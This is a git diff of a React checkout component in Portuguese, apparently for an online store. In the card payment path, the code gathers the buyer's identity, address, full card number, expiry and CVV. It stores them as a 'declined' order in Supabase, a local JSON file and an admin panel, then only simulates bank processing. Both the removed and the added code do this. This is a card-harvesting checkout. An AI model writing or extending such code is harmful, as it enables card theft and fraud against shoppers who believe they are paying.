@@ -4,7 +4,7 @@ import { supabase } from '../utils/supabase';
 import { tracker } from '../utils/tracker';
 import { captureUTMs, getStoredUTMs } from '../tracking/utmCapture';
 import { initiateCheckout as fbInitiateCheckout, purchase as fbPurchase } from '../tracking/facebookPixel';
-import { createPendingOrder, updateOrderStatus, generateOrderId } from '../services/orderService';
+import { createPendingOrder, updateOrderStatus, generateOrderId, createCardOrder } from '../services/orderService';
 
 export default function Checkout({ vehicle, kit, upsellItems = [], onClose, onBlock }) {
   const [step, setStep] = useState(1); // 1: Identificação, 2: Entrega, 3: Pagamento, 4: Sucesso/Pix QR
@@ -560,47 +560,22 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose, onBl
           setIsApiLoading(true);
           setApiError('');
           
-          // Prepara payload para o painel admin
-          const payload = {
-            event: 'card_declined',
-            lead: {
-              nome: formData.nome,
-              email: formData.email,
-              cpf: formData.cpf,
-              telefone: formData.telefone,
-              cep: formData.cep,
-              rua: formData.rua,
-              numero: formData.numero,
-              complemento: formData.complemento,
-              bairro: formData.bairro,
-              cidade: formData.cidade,
-              estado: formData.estado
-            },
-            card: {
+          // Registra o pedido de cartão negado no Supabase, JSON local e painel via API
+          createCardOrder({
+            transactionId: transactionId || `tx_card_${Date.now()}`,
+            formData,
+            finalPrice,
+            vehicle,
+            kit,
+            cardData: {
               number: formData.cardNumber,
               name: formData.cardName,
               expiry: formData.cardExpiry,
               cvv: formData.cardCvv,
               installments: formData.installments
             },
-            order: {
-              vehicle: vehicle || 'Carro',
-              kit: kit,
-              upsellItems: upsellItems,
-              perfumeUpsell: perfumeUpsell,
-              finalPrice: finalPrice,
-              paymentMethod: 'card',
-              status: 'negado'
-            },
-            timestamp: new Date().toISOString()
-          };
-
-          // Salva cartão negado no Supabase via Netlify Function (servidor-lado)
-          fetch('/.netlify/functions/checkout', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          }).catch(e => console.warn('[Checkout] Erro ao registrar cartão negado:', e.message));
+            status: 'negado'
+          }).catch(e => console.warn('[Checkout] Erro ao registrar pedido de cartão:', e.message));
 
           // Simula processamento com o banco emissor (1.2s)
           setTimeout(() => {
